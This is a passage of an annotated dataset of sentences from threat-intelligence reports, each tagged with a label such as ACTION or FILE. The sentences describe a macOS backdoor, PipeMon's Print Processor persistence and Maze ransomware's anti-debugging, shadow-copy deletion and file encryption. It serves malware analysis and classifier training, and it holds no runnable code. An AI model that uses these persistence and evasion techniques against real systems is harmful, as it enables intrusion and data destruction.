        "text": "The former was a security feature brought in by Apple to prevent executables accessing external resources via relative paths and bypassing Gatekeeper checks.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S12",
        "text": "However, like Gatekeeper itself, App Translocation relies on the executable being tagged with the com.apple.quarantine bit.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S13",
        "text": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S14",
        "text": "The second stage payload, once dumped from the encoded base64, is a universal FAT binary containing Mach-Os for i386 and x86_64 architectures.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S15",
        "text": "The source code was written in C++.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S16",
        "text": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S17",
        "text": "However, we also note that this stage has code for testing the UID and determining whether the executable is being run as root or not.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S18",
        "text": "If so, the persistence mechanism is now written to /Library/LaunchDaemons instead of the user\u2019s Library LaunchAgents folder.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S19",
        "text": "In either case, the program argument is the same, pointing to a custom subfolder in the Library folder called \u201cUser Photos\u201d and an executable, mount_devfs , which is similarly a universal FAT binary containing Mach-Os written in C++.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S20",
        "text": "A further point not mentioned in the earlier research is that the Launch Agent or Launch Daemon is written using the \u201cHidden\u201d flag so that users won\u2019t see it in the Finder by default.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S21",
        "text": "According to the earlier research, the malicious \u201cmount_devfs\u201d file provides the actors with backdoor capabilities, which include the ability to exfiltrate information as well as download files to the target machine.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S22",
        "text": "For downloading, the actors make use of the same built-in dylib as we\u2019ve seen used by Lazarus APT, libcurl.4.dylib .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S23",
        "text": "The third stage payload has the ability to collect data regarding the device and its environment, including the computer host name.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S24",
        "text": "Curiously, the sample has two hardcoded strings that presumably are meant as a \u201ccalling card\u201d or have some internal meaning to the malware developers:",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S25",
        "text": "- \"JasyndurtheHandoftheKing\"",
        "type": "STRING"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S26",
        "text": "- \"CagliostrothePrecise\"\n",
        "type": "STRING"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S0",
        "text": "PipeMon\u2019s first stage consists of a password-protected RARSFX executable embedded in the .rsrc section of its launcher.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S1",
        "text": "The launcher writes the RARSFX to setup0.exe in a directory named with a randomly generated, eight-character, ASCII string located in the directory returned by GetTempPath.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S2",
        "text": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S3",
        "text": "Note that the password is different with each sample.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S4",
        "text": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S5",
        "text": "- CrLnc.dat \u2013 Encrypted payload\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S6",
        "text": "- Duser.dll \u2013 Used for UAC bypass",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S7",
        "text": "- osksupport.dll \u2013 Used for UAC bypass",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S8",
        "text": "- PrintDialog.dll \u2013 Used for the malicious print processor initialization",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S9",
        "text": "- PrintDialog.exe \u2013 Legitimate Windows executable used to load PrintDialog.dll\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S10",
        "text": "- setup.dll \u2013 Installation DLL\n",
        "type": "COMPONENT"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S11",
        "text": "- setup.exe \u2013 Main executable",
        "type": "COMPONENT"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S12",
        "text": "Note that in the event of a folder name collision, the number at the end of the RarSFX0 string is incremented until a collision is avoided.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S13",
        "text": "Further, not all these files are necessarily present in the archive, depending on the installer.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S14",
        "text": "Once extracted, setup.exe is executed without arguments.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S15",
        "text": "Its sole purpose is to load setup.dll using LoadLibraryA.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S16",
        "text": "Once loaded, setup.dll checks whether an argument in the format \u2013x:n (where n is an integer) was provided; the mode of operation will be different depending on the presence of n.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S17",
        "text": "Supported arguments and their corresponding behavior are shown in Table 1.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S18",
        "text": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S19",
        "text": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S20",
        "text": "- C:\\Windows\\System32\\spool\\prtprocs\\x64\\DEment.dll",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S21",
        "text": "- C:\\Windows\\System32\\spool\\prtprocs\\x64\\EntAppsvc.dll",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S22",
        "text": "- C:\\Windows\\System32\\spool\\prtprocs\\x64\\Interactive.dll",
        "type": "FILE"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S23",
        "text": "depending on the variant.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S24",
        "text": "Note that we weren\u2019t able to retrieve samples related to Interactive.dll.\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S25",
        "text": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S26",
        "text": "The location where the malicious DLL is dropped was not chosen randomly.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S27",
        "text": "This is the path where Windows Print Processors are located and",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S28",
        "text": "setup.dll registers the malicious DLL loader as an alternative Print Processor by setting one of the following registry values: HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\PrintFiiterPipelineSvc\\Driver = \u201cDEment.dll\u201d or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\lltdsvc1\\Driver = \u201cEntAppsvc.dll\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S29",
        "text": "depending on the variant.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S30",
        "text": "Note the typo in PrintFiiterPipelineSvc (which has no impact on the Print Processor installation since any name can be used).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S31",
        "text": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S32",
        "text": "As a result, the malicious print process is loaded when the spooler service starts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S33",
        "text": "Note that the Print Spooler service starts at each PC startup, which ensures persistence across system resets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S34",
        "text": "This technique is really similar to the Print Monitor persistence technique (being used by DePriMon, for example) and, to our knowledge, has not been documented previously.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S35",
        "text": "Additionally, the encrypted payload, CrLnc.dat, extracted from the RARSFX is written to the registry at the following location, depending on the installer:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S36",
        "text": "- HKLM\\SOFTWARE\\Microsoft\\Print\\Components\\DC20FD7E-4B1B-4B88-8172-61F0BED7D9E8",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S37",
        "text": "- HKLM\\SOFTWARE\\Microsoft\\Print\\Components\\A66F35-4164-45FF-9CB4-69ACAA10E52D",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S38",
        "text": "This encrypted registry payload is then loaded, decrypted and executed by the previously registered Print Processor library.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S39",
        "text": "The whole PipeMon staging and persistence is shown in Figure 1.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S0",
        "text": "Maze is a complex piece of malware that uses some tricks to frustrate analysis right from the beginning.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S1",
        "text": "The malware starts preparing some functions that appear to save memory addresses in global variables to use later in dynamic calls though it does not actually use these functions later.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S2",
        "text": "Whether it is residual code existing in the entry point of the malware or a trick to mislead researchers is up for debate.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S3",
        "text": "Later, the malware enters in a big block of trash code that also includes some elements to decrypt strings and important information for later.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S4",
        "text": "The malware uses some tricks to detect debuggers at this point.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S5",
        "text": "The most important of those are: A big use of the PEB field \u201cIsDebuggerPresent\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S6",
        "text": "This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S7",
        "text": "If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S8",
        "text": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S9",
        "text": "Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S10",
        "text": "If the hash is found in this list the process will be terminated.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S11",
        "text": "For example, the process of the debugger \u201cx32dbg\u201d, is caught at this point:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S12",
        "text": "It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S13",
        "text": "A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S14",
        "text": "This short list shows the name of the process to kill and the custom hash from the special name generated from the original process name.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S15",
        "text": "The malware will kill the process with the function \u201cTerminateProcess\u201d that it gets from the EAT (Export Address Table) of the module \u201ckernel32.dll\u201d to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S16",
        "text": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S17",
        "text": "However, instead of calling it directly, it puts the parameters needed for the function on the stack, followed by a memory address with a \u201cpush\u201d opcode and then makes a direct jump to the Windows function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S18",
        "text": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S19",
        "text": "An example of this can be seen in this image:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S20",
        "text": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S21",
        "text": "The trick used here is \u201cVirtualProtect\u201d to give the function memory address of \u201cDbgUIRemoteBreakin\u201d permission to write to it:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S22",
        "text": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S23",
        "text": "This is done to avoid having a debugger attach to it in runtime.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S24",
        "text": "This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the \u201cret\u201d opcode forces the function to return without creating it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S25",
        "text": "In brief, it prevents a debugger from being attached correctly.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S26",
        "text": "It is done before enumerating the system process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S27",
        "text": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S28",
        "text": "Maze creates a mutex with the name \u201cGlobal\\x\u201d where x is a special value that is unique per machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S29",
        "text": "For example, in the next screenshot (some information has been deleted to anonymize the machine used for the analysis) is an example of this behavior.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S30",
        "text": "It is done to avoid two or more executions at the same time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S31",
        "text": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S32",
        "text": "- 0x05 -> ERROR_ACCESS_DENIED.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S33",
        "text": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S34",
        "text": "- 0xb7 -> ERROR_ALREADY_EXISTS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S35",
        "text": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S36",
        "text": "If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S37",
        "text": "It means that it will appear in the program list using 0% of the processor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S38",
        "text": "The mutex value changes either per sample or on a periodic basis to avoid the possibility of vaccines being made against it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S39",
        "text": "The malware also has a command to avoid the \u2018problem\u2019 of vaccines which will be explained later.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S40",
        "text": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S41",
        "text": "The checks are done in an obfuscated way within the jumble of the code that the malware has (in the virtual machine used here the Spanish language of Spain (es-ES) was used; it is the code 0xC0A that appears in the stack in the screenshot):",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S42",
        "text": "If the language matches any of those in the list below, the malware will clean the memory and exit the main thread without wasting any resources or making any files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S43",
        "text": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S44",
        "text": "Prior to this, the malware gets the function of \u201cWoW64DisableWow64FsRedirection\u201d with \u201cGetProcAddress\u201d and uses it to avoid redirection by default in 64-bit operating systems and calls it in a dynamic way.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S45",
        "text": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S46",
        "text": "This execution is done with the function \u201cCreateProcessW\u201d but, to increase the level of obfuscation, the malware is launched with this command:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S47",
        "text": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S48",
        "text": "It enters these folders but then promptly exits them using the command \u201c..\u201d, meaning it returns to the previous folder in the path.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S49",
        "text": "For example, in the beginning it enters the folders \u201cydw\u201d and \u201cfdygg\u201d but later returns to the root of the Windows installation unit with two \u201c..\u201d commands that lead to \u201cC:\\\u201d in this case.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S50",
        "text": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S51",
        "text": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S52",
        "text": "It is important to understand that this \u201cpath\u201d used in the command with non-existent folders is random and does not need to use the same number of folders to make the obfuscation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S53",
        "text": "After the deletion process, the malware gets the function \u201cWow64RevertWow64FsRedirection\u201d using the function \u201cGetProcAddress\u201d and calls it in a dynamic way to leave the system in the same state as before.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S54",
        "text": "Maze affects network resources too, using the functions \u201cWNetOpenEnumW\u201d, \u201cWNetEnumResourceW\u201d, \u201cWNetCloseEnum\u201d and \u201cWNetAddConnection2W\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S55",
        "text": "The malware uses two algorithms to crypt the files, ChaCha which is based on the Salsa20 algorithm that is symmetric and, for protection, an RSA algorithm that is asymmetric\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S56",
        "text": "In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S57",
        "text": "Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S58",
        "text": "Only the malware developers have the RSA private blob to decrypt their public RSA Blob.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S59",
        "text": "This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function \u201cCryptGenRandom\u201d to avoid memory dumps but, later, it will need to be decrypted before use.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S60",
        "text": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S61",
        "text": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S62",
        "text": "An example ransom note, with some data anonymized, is shown below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S63",
        "text": "The procedure to crypt the files is easy, with the malware taking the following steps:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S64",
        "text": "- Check the existence of the file with the function \u201cSetFileAttributesW\u201d with the attribute \u201cFILE_ATTRIBUTE_ARCHIVE\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S65",
        "text": "- Reserve memory to the file with a call to \u201cVirtual Alloc\u201d for the key and iv.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S66",
        "text": "- Open the file with read and write permissions with the function \u201cCreateFileW\u201d with the flag \u201cOPEN_EXISTING\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S67",
        "text": "- Get the file size with the function \u201cGetFileSizeEx\u201d (it is important for managing big files, \u201cGetFileSize\u201d is not good for bigger files).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S68",
        "text": "- Create a file mapping with the functions \u201cCreateFileMappingW\u201d and \u201cMapViewOfFile\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S69",
        "text": "- Generate a random key of 32 bytes with the function \u201cCryptGenRandom\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S70",
        "text": "- Generate a random iv of 8 bytes with the function \u201cCryptGenRandom\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S71",
        "text": "- Reserve 264 bytes of memory with the function \u201cVirtualAlloc\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S72",
        "text": "- Generate a new random extension for the victim file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S73",
        "text": "Each file has a different extension but does not lose the original extension; the new one is appended to the old one.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S74",
        "text": "For example, \u201c1.zip\u201d becomes \u201c1.zip.gthf\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S75",
        "text": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S76",
        "text": "- Write this new block with the key and iv to decrypt at the end of the file.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S77",
        "text": "- Rename the file with the function \u201cMoveFileExW\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S78",
        "text": "That way it is not possible to use forensic tools to recover the files because they use the same sector on the raw disk.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S79",
        "text": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S80",
        "text": "Instead, all changes are applied in the mapping directly, in memory, without using a file pointer on the disk to read and write, which makes the process much quicker.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S81",
        "text": "- The image of the file is unmapped, and handles closed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S82",
        "text": "- The process is repeated with new files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S83",
        "text": "The list of folders that the malware avoids are:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S84",
        "text": "- Windows main directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S85",
        "text": "- Games",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S86",
        "text": "- Tor Browser",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S87",
        "text": "- ProgramData",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S88",
        "text": "- cache2\\entries",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S89",
        "text": "- Low\\Content.IE5",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S90",
        "text": "- User Data\\Default\\Cache",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S91",
        "text": "- All Users",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S92",
        "text": "- Local Settings\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S93",
        "text": "- AppData\\Local",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S94",
        "text": "- Program Files",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S95",
        "text": "The malware ignores these file extensions:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S96",
        "text": "- LNK",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S97",
        "text": "- EXE",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S98",
        "text": "- SYS",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S99",
        "text": "- DLL",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S100",
        "text": "The malware also has a list of filenames that will not be crypted:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S101",
        "text": "- inf",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S102",
        "text": "- ini",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S103",
        "text": "- ini",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S104",
        "text": "- dat",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S105",
        "text": "- db\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S106",
        "text": "- bak\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S107",
        "text": "- dat.log",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S108",
        "text": "- db\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S109",
        "text": "- bin\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S110",
        "text": "- DECRYPT-FILES.txt",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S111",
        "text": "However, it does crypt the file \u201cntuser.ini\u201d to prevent other ransomwares from crypting it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S112",
        "text": "It creates the ransom note in each folder that it can.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S113",
        "text": "When the malware finishes crypting all files it changes the desktop wallpaper to this image:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S114",
        "text": "The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S115",
        "text": "It is important to take into consideration that the malware forges the POST string to make the connection with a random choice from a list of possible strings such as \u201cforum\u201d, \u201cphp\u201d, \u201cview\u201d, etc., to make detection harder with IPS or other filters on the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S116",
        "text": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S117",
        "text": "The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the \u201chost\u201d file in Windows.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S118",
        "text": "This makes the trace of IPs more complicated and avoids having the connection blocked.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S119",
